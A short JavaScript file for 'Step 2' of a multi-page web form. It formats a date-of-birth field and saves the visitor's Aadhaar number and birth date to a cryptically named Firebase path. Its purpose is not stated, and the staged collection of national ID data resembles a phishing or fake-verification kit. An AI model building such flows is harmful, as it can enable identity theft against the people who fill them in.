// Step 2: Append to ududip007 using existing firebaseKey

var firebaseKey = localStorage.getItem("firebaseKey");

if (!firebaseKey) {
  alert("Please complete Step 1 first.");
  window.location.href = "index.html";
}

var userRef = firebase.database().ref("ududip007/" + firebaseKey);

// Auto-slash for DOB
document.getElementById("dob").addEventListener("input", function (e) {
  let input = e.target.value.replace(/\D/g, "").slice(0, 8); // digits only
  let formatted = "";

  if (input.length >= 2) {
    formatted += input.substr(0, 2) + "/";
  } else {
    formatted += input;
  }

  if (input.length >= 4) {
    formatted += input.substr(2, 2) + "/";
    formatted += input.substr(4);
  } else if (input.length > 2) {
    formatted += input.substr(2);
  }

  e.target.value = formatted;
});

// Submit
document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var aadhaar = document.getElementById("aadhaar").value.trim();
  var dob = document.getElementById("dob").value.trim();

  userRef.update({
    d_aadhaar: aadhaar,
    e_dob: dob
  }).then(() => {
    window.location.href = "step3.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
